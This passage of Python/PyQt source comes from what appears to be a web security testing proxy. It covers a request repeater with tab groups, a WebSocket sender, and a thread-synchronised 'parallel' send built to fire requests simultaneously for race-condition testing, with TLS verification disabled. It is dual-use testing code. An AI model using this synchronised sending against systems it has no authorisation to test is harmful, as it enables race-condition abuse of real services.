            elif ll.startswith("content-length:"):
                key      = lines[k].split(":", 1)[0]
                lines[k] = f"{key}: {body_len}"
                has_cl   = True

        if not has_conn:
            lines.append("Connection: close")
        method = lines[0].split()[0].upper() if lines[0].split() else ""
        if not has_cl and (method in ("POST", "PUT", "PATCH") or body_len > 0):
            lines.append(f"Content-Length: {body_len}")

        return ("\r\n".join(lines) + "\r\n\r\n" + body_part).encode("utf-8", errors="replace")

    @staticmethod
    def _decode_response(raw_resp: bytes) -> str:
        """Decompress gzip if present, then decode to string."""
        if b"\r\n\r\n" in raw_resp:
            sep_b = b"\r\n\r\n"
            hb, bb = raw_resp.split(sep_b, 1)
        elif b"\n\n" in raw_resp:
            sep_b = b"\n\n"
            hb, bb = raw_resp.split(sep_b, 1)
        else:
            return raw_resp.decode("utf-8", errors="replace")

        if re.search(rb'content-encoding:\s*gzip', hb, re.IGNORECASE) and bb:
            try:
                bb = gzip.decompress(bb)
            except Exception:
                pass
        elif re.search(rb'content-encoding:\s*deflate', hb, re.IGNORECASE) and bb:
            try:
                import zlib
                bb = zlib.decompress(bb)
            except Exception:
                pass
        elif re.search(rb'content-encoding:\s*br', hb, re.IGNORECASE) and bb:
            try:
                import brotli
                bb = brotli.decompress(bb)
            except Exception:
                pass

        return (hb.decode("utf-8", errors="replace")
                + sep_b.decode("utf-8")
                + bb.decode("utf-8", errors="replace"))

    def _send_parallel_enhanced(self):
        """
        True simultaneous parallel send with robust failure handling.
        
        Strategy:
        1. All threads connect and prepare
        2. Threads that successfully connect wait at a barrier
        3. After a timeout, all connected threads are released simultaneously
        4. Failed threads report errors without blocking successful ones
        5. All successful threads send at virtually the same time
        """
        n = len(self.tabs)
        results = [None] * n
        socks = [None] * n
        payloads = [None] * n
        errors = [None] * n
        ready = [False] * n
        
        # Count how many threads successfully connected
        success_count_lock = threading.Lock()
        success_count = [0]  # Use list for mutable closure
        
        # Barrier with timeout - only counts threads that reach it
        # We'll use a custom synchronization mechanism
        ready_event = threading.Event()
        send_trigger = threading.Event()
        
        def _worker(i, host, port, use_ssl, raw, timeout):
            try:
                # Phase 1: Connect and prepare
                sock = socket.create_connection((host, port), timeout=timeout)
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                socks[i] = sock
                payloads[i] = self._prepare_raw_bytes(raw)
                ready[i] = True
                
                with success_count_lock:
                    success_count[0] += 1
                
                # Wait for send trigger (all ready or timeout)
                # But don't wait forever - this allows successful threads to send
                # even if some threads failed
                send_trigger.wait(timeout=30)
                
                # Phase 2: Send simultaneously
                if send_trigger.is_set() and socks[i] is not None:
                    start = time.monotonic()
                    socks[i].sendall(payloads[i])
                    
                    # Phase 3: Read responses
                    chunks = []
                    socks[i].settimeout(timeout)
                    try:
                        while True:
                            chunk = socks[i].recv(65536)
                            if not chunk:
                                break
                            chunks.append(chunk)
                    except socket.timeout:
                        pass
                    finally:
                        try:
                            socks[i].close()
                        except Exception:
                            pass
                    
                    elapsed_ms = (time.monotonic() - start) * 1000
                    raw_resp = b"".join(chunks)
                    results[i] = (self._decode_response(raw_resp), elapsed_ms, len(raw_resp))
                    
            except Exception as exc:
                errors[i] = str(exc)
                if socks[i] is not None:
                    try:
                        socks[i].close()
                    except Exception:
                        pass

        # Launch all worker threads
        threads = []
        for i in range(n):
            th = threading.Thread(
                target=_worker,
                args=(i,) + tuple(self.tabs[i]),
                daemon=True,
                name=f"race-{i}"
            )
            threads.append(th)
            th.start()
        
        # Wait for threads to connect (with timeout)
        connect_timeout = 30
        start_time = time.time()
        while time.time() - start_time < connect_timeout:
            with success_count_lock:
                if success_count[0] > 0:
                    # Some threads connected, we can trigger the send
                    # but wait a bit more to let more threads connect
                    time.sleep(0.1)
                    break
            time.sleep(0.05)
        
        # Trigger all ready threads to send simultaneously
        # Add a small random delay to avoid network congestion
        # but still maintain near-simultaneous sends
        time.sleep(random.uniform(0.01, 0.05))
        send_trigger.set()
        
        # Wait for all threads to complete
        for th in threads:
            th.join(timeout=60)
        
        # Emit signals in order
        for i in range(n):
            self.tab_started.emit(i)
            if errors[i] is not None:
                self.tab_error.emit(i, errors[i])
            elif results[i] is not None:
                self.tab_finished.emit(i, *results[i])
            else:
                self.tab_error.emit(i, "Request failed - connection timeout")

    def _send_sequential_enhanced(self):
        """Enhanced sequential send with progress tracking."""
        for i, (host, port, use_ssl, raw, timeout) in enumerate(self.tabs):
            self.tab_started.emit(i)
            try:
                resp_text, elapsed_ms, size = _raw_http_send(host, port, use_ssl, raw, timeout)
                self.tab_finished.emit(i, resp_text, elapsed_ms, size)
            except Exception as exc:
                self.tab_error.emit(i, str(exc))

    def run(self):
        try:
            if self.mode == "sequential":
                self._send_sequential_enhanced()
            else:
                self._send_parallel_enhanced()
        except Exception as exc:
            logger.error(f"GroupSendThread crashed: {exc}", exc_info=True)
            for i in range(len(self.tabs)):
                self.tab_error.emit(i, f"Internal error: {exc}")
        finally:
            self.all_done.emit()


class RepeaterTab(QWidget):
    """
    Repeater with inline group headers in the tab bar.

    All tabs live in one flat QTabWidget:
      [ 📁 Group 1 ] [ Tab 1 ] [ Tab 2 ] [ ＋ ] [ 📁 Group 2 ] [ Tab 3 ] …

    Group header tabs are styled with a coloured background and cannot be
    used as content — clicking one jumps to the first request tab of that group.
    Right-clicking a group header → group menu.
    Right-clicking a request tab   → tab menu.
    """

    MENU_STYLE = (
        f"QMenu{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
        f"border:1px solid {COLOR_BORDER};padding:3px;}}"
        f"QMenu::item{{padding:5px 20px 5px 10px;border-radius:3px;}}"
        f"QMenu::item:selected{{background:{COLOR_ACCENT};color:#fff;}}"
        f"QMenu::separator{{height:1px;background:{COLOR_BORDER};margin:3px 6px;}}"
    )
    BTN_STYLE = (
        f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
        f"border:1px solid {COLOR_BORDER};border-radius:4px;"
        f"padding:0 12px;font-size:12px;}}"
        f"QPushButton:hover{{background:{COLOR_HOVER};}}"
    )

    def __init__(self, parent=None):
        super().__init__(parent)
        self._tab_counter   = 1
        self._group_counter = 1
        # _groups: [{"name": str, "header_idx": int, "color_idx": int}]
        self._groups: list  = []
        self._active_group_thread = None
        self._setup_ui()
        # Start with one default group
        self._new_group("Group 1", _silent=True)

    # ─────────────────────────────────────────────────────────────────────────
    # UI construction
    # ─────────────────────────────────────────────────────────────────────────

    def _setup_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # ── Top bar ───────────────────────────────────────────────────────────
        top_bar = QFrame()
        top_bar.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};border-bottom:1px solid {COLOR_BORDER};"
        )
        top_bar.setFixedHeight(38)
        tl = QHBoxLayout(top_bar)
        tl.setContentsMargins(8, 4, 8, 4)
        tl.setSpacing(6)

        icon_label = QLabel("⟳  REPEATER")
        icon_label.setStyleSheet(
            f"color:{COLOR_ACCENT};font-weight:700;font-size:13px;letter-spacing:1px;"
        )
        tl.addWidget(icon_label)

        tl.addStretch()

        for label, slot in [
            ("＋ New Tab",    self._new_tab_action),
            ("⊞ New Group",   self._new_group),
            ("✎ Rename",      self._rename_current_action),
            ("⎘ Duplicate",   self._duplicate_current_action),
        ]:
            b = QPushButton(label)
            b.setFixedHeight(26)
            b.setStyleSheet(self.BTN_STYLE)
            b.clicked.connect(slot)
            tl.addWidget(b)

        close_btn = QPushButton("✕ Close")
        close_btn.setFixedHeight(26)
        close_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_CRITICAL};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;padding:0 12px;font-size:12px;}}"
            f"QPushButton:hover{{background:{COLOR_HOVER};}}"
        )
        close_btn.clicked.connect(self._close_current_action)
        tl.addWidget(close_btn)

        tl.addSpacing(12)

        self.send_group_btn = QPushButton("▶▶  Send Group  ▾")
        self.send_group_btn.setFixedHeight(26)
        self.send_group_btn.setStyleSheet(
            "QPushButton{background:#2a4a2a;color:#a6e3a1;"
            "border:1px solid #4a7a4a;border-radius:4px;padding:0 12px;"
            "font-size:12px;font-weight:bold;}"
            "QPushButton:hover{background:#3a6a3a;}"
        )
        self.send_group_btn.clicked.connect(self._show_send_group_menu)
        tl.addWidget(self.send_group_btn)

        # ── Single flat tab widget ────────────────────────────────────────────
        self.tabs = QTabWidget()
        self.tabs.setTabsClosable(False)
        self.tabs.setMovable(False)   # we manage order ourselves
        self.tabs.setStyleSheet(f"""
            QTabWidget::pane {{
                border: none;
                background: {COLOR_BACKGROUND};
            }}
            QTabBar::tab {{
                background: {COLOR_ELEVATED_BG};
                color: {COLOR_TEXT_MUTED};
                padding: 6px 14px;
                border: none;
                border-right: 1px solid {COLOR_BORDER};
                font-size: 12px;
                min-width: 70px;
            }}
            QTabBar::tab:selected {{
                background: {COLOR_BACKGROUND};
                color: {COLOR_ACCENT};
                border-top: 2px solid {COLOR_ACCENT};
            }}
            QTabBar::tab:hover:!selected {{
                color: {COLOR_TEXT};
            }}
        """)
        self.tabs.currentChanged.connect(self._on_tab_changed)
        self.tabs.tabBar().setContextMenuPolicy(Qt.CustomContextMenu)
        self.tabs.tabBar().customContextMenuRequested.connect(self._on_tab_bar_context_menu)

        root.addWidget(top_bar)
        root.addWidget(self.tabs)

    # ─────────────────────────────────────────────────────────────────────────
    # Group helpers
    # ─────────────────────────────────────────────────────────────────────────

    def _color_for_group(self, color_idx: int) -> tuple:
        """Return (bg_hex, fg_hex) for a group's header tab."""
        return _GROUP_COLORS[color_idx % len(_GROUP_COLORS)]

    def _apply_group_header_style(self, tab_idx: int, color_idx: int, name: str):
        """Style the tab at tab_idx as a group header with colored background."""
        bg, fg = self._color_for_group(color_idx)
        bar = self.tabs.tabBar()
        bar.setTabText(tab_idx, f"⬡ {name}")
        bar.setTabTextColor(tab_idx, QColor(fg))
        # Store metadata including colors for the paint delegate
        bar.setTabData(tab_idx, {"type": "group_header", "bg": bg, "fg": fg, "color_idx": color_idx})

    def _find_group_by_header_idx(self, header_idx: int) -> int:
        """Return the index in self._groups for a given header tab index, or -1."""
        for i, g in enumerate(self._groups):
            if g["header_idx"] == header_idx:
                return i
        return -1

    def _find_group_for_tab(self, tab_idx: int) -> int:
        """Return the group index that owns tab_idx (request tab), or -1."""
        # A tab belongs to the group whose header_idx is the largest header_idx <= tab_idx
        best = -1
        best_group = -1
        for i, g in enumerate(self._groups):
            h = g["header_idx"]
            if h <= tab_idx and h > best:
                best = h
                best_group = i
        return best_group

    def _group_request_tabs(self, group_idx: int) -> list:
        """Return list of tab indices that are request tabs in this group."""
        if group_idx < 0 or group_idx >= len(self._groups):
            return []
        g   = self._groups[group_idx]
        h   = g["header_idx"]
        # Next group's header or end
        next_h = self.tabs.count()
        for other in self._groups:
            oh = other["header_idx"]
            if oh > h:
                next_h = min(next_h, oh)
        return [i for i in range(h + 1, next_h)
                if not self._is_group_header(i)]

    def _is_group_header(self, tab_idx: int) -> bool:
        data = self.tabs.tabBar().tabData(tab_idx)
        return isinstance(data, dict) and data.get("type") == "group_header"

    def _current_group_idx(self) -> int:
        """Return the group index for the currently active tab."""
        idx = self.tabs.currentIndex()
        if idx < 0:
            return 0 if self._groups else -1
        if self._is_group_header(idx):
            return self._find_group_by_header_idx(idx)
        return self._find_group_for_tab(idx)

    def _shift_group_headers(self, after_pos: int, delta: int):
        """Update stored header_idx for all groups whose header is after after_pos."""
        for g in self._groups:
            if g["header_idx"] > after_pos:
                g["header_idx"] += delta

    # ─────────────────────────────────────────────────────────────────────────
    # Group management
    # ─────────────────────────────────────────────────────────────────────────

    def _new_group(self, name: str = "", _silent: bool = False):
        if not _silent:
            name, ok = QInputDialog.getText(
                self, "New Group", "Group name:",
                text=f"Group {self._group_counter}"
            )
            if not ok or not name.strip():
                return
            name = name.strip()
        else:
            name = name or f"Group {self._group_counter}"

        color_idx  = len(self._groups)
        self._group_counter += 1

        # Insert header tab at end
        header_widget = _GroupHeaderWidget(name)
        insert_pos    = self.tabs.count()
        self.tabs.insertTab(insert_pos, header_widget, f"⬡ {name}")
        self._apply_group_header_style(insert_pos, color_idx, name)

        self._groups.append({
            "name":       name,
            "header_idx": insert_pos,
            "color_idx":  color_idx,
        })

        # Add one empty request tab after the header
        self._new_tab(group_idx=len(self._groups) - 1)

    def _rename_group(self, group_idx: int):
        if group_idx < 0 or group_idx >= len(self._groups):
            return
        g   = self._groups[group_idx]
        old = g["name"]
        name, ok = QInputDialog.getText(self, "Rename Group", "Name:", text=old)
        if ok and name.strip():
            g["name"] = name.strip()
            self._apply_group_header_style(g["header_idx"], g["color_idx"], name.strip())

    def _delete_group(self, group_idx: int):
        if len(self._groups) == 1:
            QMessageBox.information(self, "Cannot Delete",
                                    "At least one group must remain.")
            return
        g           = self._groups[group_idx]
        req_tabs    = self._group_request_tabs(group_idx)
        all_indices = sorted([g["header_idx"]] + req_tabs, reverse=True)

        for idx in all_indices:
            self.tabs.removeTab(idx)

        # Recalculate header positions for remaining groups
        for other_g in self._groups:
            cnt = sum(1 for i in all_indices if i < other_g["header_idx"])
            other_g["header_idx"] -= cnt

        self._groups.pop(group_idx)

        # Make sure we're on a valid request tab
        self._select_nearest_request_tab()

    def _select_nearest_request_tab(self):
        """After deletion, ensure the current index is a request tab."""
        for i in range(self.tabs.currentIndex(), self.tabs.count()):
            if not self._is_group_header(i):
                self.tabs.setCurrentIndex(i)
                return
        for i in range(self.tabs.currentIndex(), -1, -1):
            if not self._is_group_header(i):
                self.tabs.setCurrentIndex(i)
                return

    # ─────────────────────────────────────────────────────────────────────────
    # Tab management with professional numbering
    # ─────────────────────────────────────────────────────────────────────────

    def _get_next_tab_number(self, base_name: str) -> int:
        """Get the next available number for a tab name pattern."""
        # Extract existing numbers from tabs in the same group
        current_group = self._current_group_idx()
        if current_group < 0:
            return 1
            
        req_tabs = self._group_request_tabs(current_group)
        numbers = []
        
        # Pattern to match base_name followed by a number
        pattern = re.compile(rf'^{re.escape(base_name)}\s+(\d+)$')
        
        for idx in req_tabs:
            tab_text = self.tabs.tabText(idx)
            match = pattern.match(tab_text)
            if match:
                numbers.append(int(match.group(1)))
        
        if not numbers:
            return 1
        
        # Find the smallest missing number
        numbers.sort()
        for i, num in enumerate(numbers, 1):
            if num != i:
                return i
        return len(numbers) + 1

    def _new_tab(self, name: str = "", group_idx: int = -1) -> Optional["RepeaterInstance"]:
        if group_idx < 0:
            group_idx = self._current_group_idx()
        if group_idx < 0:
            return None

        g = self._groups[group_idx]

        # Insert position: just before the next group's header (or at end)
        next_header = self.tabs.count()
        for other in self._groups:
            oh = other["header_idx"]
            if oh > g["header_idx"]:
                next_header = min(next_header, oh)

        if not name:
            name = f"Tab {self._tab_counter}"
            self._tab_counter += 1

        inst = RepeaterInstance(name)
        insert_pos = next_header
        self.tabs.insertTab(insert_pos, inst, name)

        # Shift header indices for groups that come after
        self._shift_group_headers(g["header_idx"], 1)

        self.tabs.setCurrentIndex(insert_pos)
        return inst

    def _tab_bar_text(self, idx: int) -> str:
        return self.tabs.tabBar().tabText(idx)

    # ─────────────────────────────────────────────────────────────────────────
    # Tab bar event handling
    # ─────────────────────────────────────────────────────────────────────────

    def _on_tab_changed(self, idx: int):
        """If user clicks a group header, redirect to first request tab of group."""
        if idx < 0:
            return
        if self._is_group_header(idx):
            g_idx = self._find_group_by_header_idx(idx)
            req   = self._group_request_tabs(g_idx)
            if req:
                self.tabs.setCurrentIndex(req[0])

    def _on_tab_bar_context_menu(self, pos):
        idx = self.tabs.tabBar().tabAt(pos)
        if idx < 0:
            return
        if self._is_group_header(idx):
            self._show_group_header_menu(idx, pos)
        else:
            self._show_request_tab_menu(idx, pos)

    def _show_group_header_menu(self, header_idx: int, pos):
        g_idx = self._find_group_by_header_idx(header_idx)
        menu  = QMenu(self)
        menu.setStyleSheet(self.MENU_STYLE)
        rename_act = menu.addAction("✎  Rename Group")
        send_seq   = menu.addAction("▶▶  Send Group (Sequential)")
        send_par   = menu.addAction("⚡  Send Group (Parallel)")
        menu.addSeparator()
        del_act    = menu.addAction("✕  Delete Group")
        act = menu.exec_(self.tabs.tabBar().mapToGlobal(pos))
        if act == rename_act:
            self._rename_group(g_idx)
        elif act == send_seq:
            self._send_group(g_idx, "sequential")
        elif act == send_par:
            self._send_group(g_idx, "parallel")
        elif act == del_act:
            self._delete_group(g_idx)

    def _show_request_tab_menu(self, tab_idx: int, pos):
        g_idx = self._find_group_for_tab(tab_idx)
        menu  = QMenu(self)
        menu.setStyleSheet(self.MENU_STYLE)
        rename_act = menu.addAction("✎  Rename Tab")
        dup_act    = menu.addAction("⎘  Duplicate Tab")

        # Move to group submenu
        if len(self._groups) > 1:
            move_menu = menu.addMenu("⬡  Move to Group")
            move_menu.setStyleSheet(self.MENU_STYLE)
            move_acts = {}
            for i, g in enumerate(self._groups):
                if i != g_idx:
                    a = move_menu.addAction(f"⬡  {g['name']}")
                    move_acts[a] = i

        menu.addSeparator()
        close_act = menu.addAction("✕  Close Tab")
        act = menu.exec_(self.tabs.tabBar().mapToGlobal(pos))

        if act == rename_act:
            w = self.tabs.widget(tab_idx)
            old = self.tabs.tabText(tab_idx)
            name, ok = QInputDialog.getText(self, "Rename Tab", "Tab name:", text=old)
            if ok and name.strip():
                self.tabs.setTabText(tab_idx, name.strip())
                if isinstance(w, RepeaterInstance):
                    w.name = name.strip()
        elif act == dup_act:
            self._duplicate_tab(tab_idx)
        elif len(self._groups) > 1 and act in move_acts:
            self._move_tab_to_group(tab_idx, move_acts[act])
        elif act == close_act:
            req = self._group_request_tabs(g_idx)
            if len(req) > 1:
                self._shift_group_headers(tab_idx, -1)
                self.tabs.removeTab(tab_idx)
            else:
                # Last tab in group — just clear it
                w = self.tabs.widget(tab_idx)
                if isinstance(w, RepeaterInstance):
                    w.request_editor.clear()
                    w.resp_pretty.clear()
                    w.resp_raw.clear()
                    w.resp_headers.clear()

    # ─────────────────────────────────────────────────────────────────────────
    # Top-bar button actions
    # ─────────────────────────────────────────────────────────────────────────

    def _new_tab_action(self):
        self._new_tab()

    def _rename_current_action(self):
        idx = self.tabs.currentIndex()
        if idx < 0 or self._is_group_header(idx):
            # Rename the group instead
            g_idx = self._current_group_idx()
            self._rename_group(g_idx)
            return
        w   = self.tabs.widget(idx)
        old = self.tabs.tabText(idx)
        name, ok = QInputDialog.getText(self, "Rename Tab", "Tab name:", text=old)
        if ok and name.strip():
            self.tabs.setTabText(idx, name.strip())
            if isinstance(w, RepeaterInstance):
                w.name = name.strip()

    def _duplicate_current_action(self):
        idx = self.tabs.currentIndex()
        if idx >= 0 and not self._is_group_header(idx):
            self._duplicate_tab(idx)

    def _close_current_action(self):
        idx = self.tabs.currentIndex()
        if idx < 0 or self._is_group_header(idx):
            return
        g_idx = self._find_group_for_tab(idx)
        req   = self._group_request_tabs(g_idx)
        if len(req) > 1:
            self._shift_group_headers(idx, -1)
            self.tabs.removeTab(idx)
        else:
            w = self.tabs.widget(idx)
            if isinstance(w, RepeaterInstance):
                w.request_editor.clear()
                w.resp_pretty.clear()
                w.resp_raw.clear()
                w.resp_headers.clear()

    # ─────────────────────────────────────────────────────────────────────────
    # Tab helpers with professional numbering
    # ─────────────────────────────────────────────────────────────────────────

    def _duplicate_tab(self, tab_idx: int):
        """Duplicate a tab with professional numbering (test → test, test 2, test 3, etc.)."""
        src = self.tabs.widget(tab_idx)
        if not isinstance(src, RepeaterInstance):
            return
            
        original_name = self.tabs.tabText(tab_idx)
        
        # Extract base name without numbers
        base_name = re.sub(r'\s+\d+$', '', original_name)
        if not base_name:
            base_name = original_name
            
        # Get the next available number for this base name
        next_num = self._get_next_tab_number(base_name)
        
        # Create new name with number
        if next_num == 1:
            new_name = base_name
        else:
            new_name = f"{base_name} {next_num}"
        
        g_idx = self._find_group_for_tab(tab_idx)
        inst = self._new_tab(new_name, group_idx=g_idx)
        
        if inst:
            # Copy all request data
            inst.request_editor.setPlainText(src.request_editor.toPlainText())
            inst.host_input.setText(src.host_input.text())
            inst.port_input.setText(src.port_input.text())
            inst.ssl_check.setChecked(src.ssl_check.isChecked())
            
            # Copy timeout if it exists
            if hasattr(src, 'timeout_spin'):
                inst.timeout_spin.setValue(src.timeout_spin.value())
            
            # Update tab counter to avoid conflicts
            self._tab_counter = max(self._tab_counter, next_num + 1)

    def _move_tab_to_group(self, tab_idx: int, dest_group_idx: int):
        widget = self.tabs.widget(tab_idx)
        label  = self.tabs.tabText(tab_idx)
        if not isinstance(widget, RepeaterInstance):
            return
        src_g_idx = self._find_group_for_tab(tab_idx)
        src_req   = self._group_request_tabs(src_g_idx)

        # Remove from source
        self._shift_group_headers(tab_idx, -1)
        self.tabs.removeTab(tab_idx)

        # Recalculate dest group since indices shifted
        # dest_group_idx unchanged, but dest group's header_idx may have shifted
        dest_g  = self._groups[dest_group_idx]
        next_h  = self.tabs.count()
        for other in self._groups:
            oh = other["header_idx"]
            if oh > dest_g["header_idx"]:
                next_h = min(next_h, oh)

        self.tabs.insertTab(next_h, widget, label)
        self._shift_group_headers(dest_g["header_idx"], 1)
        self.tabs.setCurrentIndex(next_h)

    # ─────────────────────────────────────────────────────────────────────────
    # Send Group
    # ─────────────────────────────────────────────────────────────────────────

    def _show_send_group_menu(self):
        menu = QMenu(self)
        menu.setStyleSheet(self.MENU_STYLE)
        g_idx = self._current_group_idx()
        grp_name = self._groups[g_idx]["name"] if g_idx >= 0 and self._groups else "Group"
        menu.addAction(f"▶▶  Sequential  —  send all in '{grp_name}' in order").triggered.connect(
            lambda: self._send_group(self._current_group_idx(), "sequential")
        )
        menu.addAction(f"⚡  Parallel  —  send all in '{grp_name}' simultaneously").triggered.connect(
            lambda: self._send_group(self._current_group_idx(), "parallel")
        )
        menu.addSeparator()
        menu.addAction("▶  Send current tab only").triggered.connect(self._send_current_tab)
        menu.exec_(self.send_group_btn.mapToGlobal(self.send_group_btn.rect().bottomLeft()))

    def _send_current_tab(self):
        idx = self.tabs.currentIndex()
        if idx >= 0 and not self._is_group_header(idx):
            w = self.tabs.widget(idx)
            if isinstance(w, RepeaterInstance):
                w._send_request()

    def _send_group(self, group_idx: int, mode: str = "sequential"):
        req_indices = self._group_request_tabs(group_idx)
        tabs_data   = []
        instances   = []

        for i in req_indices:
            w = self.tabs.widget(i)
            if not isinstance(w, RepeaterInstance):
                continue
            # Flush GQL panel edits if GQL view is active for this instance
            if getattr(w, "_gql_req_mode", False):
                w._sync_gql_to_raw()
            raw = w.request_editor.toPlainText().strip()
            if not raw:
                continue
            host = w.host_input.text().strip() or w._parse_host_from_request()
            if not host:
                continue
            try:
                port = int(w.port_input.text()) if w.port_input.text() else (
                    443 if w.ssl_check.isChecked() else 80
                )
            except ValueError:
                port = 443 if w.ssl_check.isChecked() else 80
            tabs_data.append((host, port, w.ssl_check.isChecked(), raw, w.timeout_spin.value()))
            instances.append(w)

        if not tabs_data:
            QMessageBox.information(self, "No Requests",
                                    "No tabs with requests in the current group.")
            return

        n = len(instances)
        mode_label = "⚡ Parallel" if mode == "parallel" else "▶▶ Sequential"

        # Pre-flight UI
        for w in instances:
            w.send_btn.setEnabled(False)
            w.resp_pretty.setPlainText("")
            w.resp_raw.setPlainText("")
            w.resp_headers.setPlainText("")
            w.status_badge.setText("")
            w.length_badge.setText("")
            w.time_badge.setText("")
            if mode == "parallel":
                w.send_btn.setText("⚡ Syncing…")
                w.status_bar.setText(f"Waiting for connections ({n} tabs)...")
            else:
                w.send_btn.setText("⏳ Queued…")
                w.status_bar.setText("Queued — sequential send…")

        self.send_group_btn.setEnabled(False)
        self.send_group_btn.setText(f"⏳ {mode_label}…")

        thread = GroupSendThread(tabs_data, mode)

        # Use named functions to avoid late-binding lambda bugs
        def _on_started(i):
            if i >= len(instances):
                return
            w = instances[i]
            if mode == "parallel":
                # In parallel mode, we'll update when finished
                pass
            else:
                w.send_btn.setText("⏳ Sending…")
                w.status_bar.setText("Sending…")

        def _on_finished(i, r, e, s):
            if i < len(instances):
                instances[i]._on_response(r, e, s)

        def _on_error(i, err):
            if i < len(instances):
                instances[i]._on_send_error(err)

        def _on_all_done():
            self.send_group_btn.setEnabled(True)
            self.send_group_btn.setText("▶▶  Send Group  ▾")

        thread.tab_started.connect(_on_started)
        thread.tab_finished.connect(_on_finished)
        thread.tab_error.connect(_on_error)
        thread.all_done.connect(_on_all_done)

        self._active_group_thread = thread
        thread.start()

    # ─────────────────────────────────────────────────────────────────────────
    # Public API
    # ─────────────────────────────────────────────────────────────────────────

    def add_request(self, raw_request: str, host: str = "",
                    port: int = 0, use_ssl: bool = True,
                    tab_name: str = "") -> Optional["RepeaterInstance"]:
        inst = self._new_tab(tab_name or f"Request {self._tab_counter - 1}")
        if inst:
            inst.load_request(raw_request, host, port, use_ssl)
        return inst

    def add_ws_request(self, url: str, payload: str, opcode: str = "text",
                       tab_name: str = "",
                       extra_headers: dict | None = None) -> "WSRepeaterInstance":
        """Add a WebSocket sender tab to the Repeater."""
        name = tab_name or f"WS {self._tab_counter}"
        self._tab_counter += 1
        inst = WSRepeaterInstance(url, payload, opcode, name,
                                  extra_headers=extra_headers or {})
        # Insert after the last tab (no group management needed for WS tabs)
        self.tabs.addTab(inst, f"🔌 {name}")
        self.tabs.setCurrentWidget(inst)
        return inst

    def refresh_custom_payloads(self):
        """Refresh payload buttons in all RepeaterInstance tabs."""
        for i in range(self.tabs.count()):
            w = self.tabs.widget(i)
            if isinstance(w, RepeaterInstance):
                w._refresh_payload_buttons()


# ─────────────────────────────────────────────────────────────────────────────
# WebSocket Sender – background thread
# ─────────────────────────────────────────────────────────────────────────────

class WSSendThread(QThread):
    """
    Opens a WebSocket connection, sends one message, collects replies for a
    few seconds, then exits.  Instantiate a new one for each Send click.
    """
    connected   = pyqtSignal()
    msg_rx      = pyqtSignal(str)   # one received frame (text or hex string)
    error       = pyqtSignal(str)
    finished_ok = pyqtSignal()

    def __init__(self, url: str, payload: str, opcode: str,
                 extra_headers: dict | None = None):
        super().__init__()
        self._url     = url
        self._payload = payload
        self._opcode  = opcode
        self._headers = extra_headers or {}
        self._stop    = False

    def stop(self):
        self._stop = True

    def run(self):
        try:
            import websocket as _ws
        except ImportError:
            self.error.emit("websocket-client not installed – run: pip install websocket-client")
            return
        try:
            sslopt = {"cert_reqs": ssl.CERT_NONE}

            # ── Determine Origin ──────────────────────────────────────────────
            # websocket-client sends Origin automatically.  We pass it via the
            # dedicated `origin` parameter (not as a header) so the library never
            # produces a duplicate.  If the caller already supplied an Origin
            # header we use that value; otherwise we derive it from the URL.
            parsed_url = urllib.parse.urlparse(self._url)
            host_for_origin = parsed_url.hostname or ""
            scheme_for_origin = "https" if parsed_url.scheme in ("wss", "https") else "http"
            default_origin = f"{scheme_for_origin}://{host_for_origin}"

            # ── Build header list ─────────────────────────────────────────────
            # websocket-client requires a LIST of "Key: Value" strings.
            # Strip any headers the library manages itself to avoid duplicates.
            _WS_INTERNAL = {
                "upgrade", "connection", "host",
                "sec-websocket-key", "sec-websocket-version",
                "sec-websocket-extensions", "sec-websocket-protocol",
                "origin",   # handled via the `origin=` parameter below
            }
            caller_origin = None
            header_list: list = []
            for k, v in self._headers.items():
                if k.strip().lower() == "origin":
                    caller_origin = v.strip()   # capture but don't add to list
                elif k.strip().lower() not in _WS_INTERNAL:
                    header_list.append(f"{k.strip()}: {v.strip()}")

            origin = caller_origin or default_origin

            ws = _ws.create_connection(
                self._url,
                timeout=15,
                sslopt=sslopt,
                header=header_list,   # list of strings, no Origin here
                origin=origin,        # library injects exactly one Origin header
            )
        except Exception as e:
            self.error.emit(str(e))
            return

        self.connected.emit()
        try:
            if self._opcode == "binary":
                try:
                    ws.send_binary(bytes.fromhex(self._payload))
                except ValueError:
                    ws.send_binary(self._payload.encode("utf-8"))
            else:
                ws.send(self._payload)

            ws.settimeout(2.0)
            deadline = time.time() + 8   # give the server more time to reply
            while not self._stop and time.time() < deadline:
                try:
                    resp = ws.recv()
                    if isinstance(resp, bytes):
                        resp = resp.hex()
                    self.msg_rx.emit(resp)
                    deadline = time.time() + 3   # extend window after each frame
                except _ws.WebSocketTimeoutException:
                    # Normal read-timeout – keep waiting until the deadline
                    continue
                except Exception:
                    # Real error (connection closed, etc.) – stop the loop
                    break
        finally:
            try:
                ws.close()
            except Exception:
                pass
        self.finished_ok.emit()


# ─────────────────────────────────────────────────────────────────────────────
# WebSocket Repeater tab widget
# ─────────────────────────────────────────────────────────────────────────────

class WSRepeaterInstance(QWidget):
    """
    WS repeater pane – lives as a proper tab inside RepeaterTab.

    ┌─ URL ─────────────────────────────────────────────────────────────────┐
    ├─ Headers ─────────────────────────────────────────────────────────────┤
    ├─ Payload editor (left) │ Response log (right) ────────────────────────┤
    └─ [▶ Send] ────────────────── status ──────────────────────────────────┘
    """

    def __init__(self, url: str, payload: str, opcode: str = "text",
                 name: str = "WS", parent=None, extra_headers: dict | None = None):
        super().__init__(parent)
        self._opcode = opcode
        self._initial_headers = extra_headers or {}
        self._thread: WSSendThread | None = None
        self._messages: list = []   # list of {direction, opcode, payload}
        self._msg_counter: int = 0
        self._build_ui(url, payload)
        self._apply_style()

    # ── UI construction ────────────────────────────────────────────────────

    def _build_ui(self, url: str, payload: str):
        root = QVBoxLayout(self)
        root.setContentsMargins(8, 8, 8, 8)
        root.setSpacing(6)

        # URL row
        url_row = QHBoxLayout()
        url_lbl = QLabel("URL:")
        url_lbl.setFixedWidth(55)
        url_row.addWidget(url_lbl)
        self._url_edit = QLineEdit(url)
        self._url_edit.setPlaceholderText("wss://target/path")
